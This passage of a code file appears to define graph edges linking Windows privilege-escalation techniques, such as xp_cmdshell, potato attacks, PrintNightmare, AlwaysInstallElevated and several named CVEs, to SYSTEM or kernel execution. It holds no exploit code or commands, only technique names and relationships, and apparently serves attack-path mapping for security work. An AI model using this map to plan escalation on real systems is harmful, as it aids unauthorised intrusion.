  { source: 'pe-mssql-xpcmdshell', target: 'pe-seimpersonate-potato', rel: 'enables', label: 'SQL account has SeImpersonate' },
  { source: 'pe-vuln-software', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-insecure-gui', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-printnightmare', target: 'nt-system', rel: 'host-exec' },

  { source: 'pe-always-install-elevated', target: 'nt-system', rel: 'host-exec' },

  // Known Exploits (CVE) -> outcome.
  { source: 'pe-kernel-enum', target: 'pe-kernel-exploit', rel: 'enables' },
  { source: 'pe-kernel-exploit', target: 'pe-prim-kernel-exec', rel: 'enables' },
  { source: 'pe-cve-2023-21768', target: 'pe-prim-kernel-exec', rel: 'enables' },
  { source: 'pe-cve-2021-1732', target: 'pe-prim-kernel-exec', rel: 'enables' },
  { source: 'pe-cve-2020-0787', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-cve-2019-1388', target: 'nt-system', rel: 'host-exec' },

  // Mechanisms -> SYSTEM.
  { source: 'pe-prim-service-exec', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-prim-trigger', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-prim-kernel-exec', target: 'nt-system', rel: 'host-exec' },
];
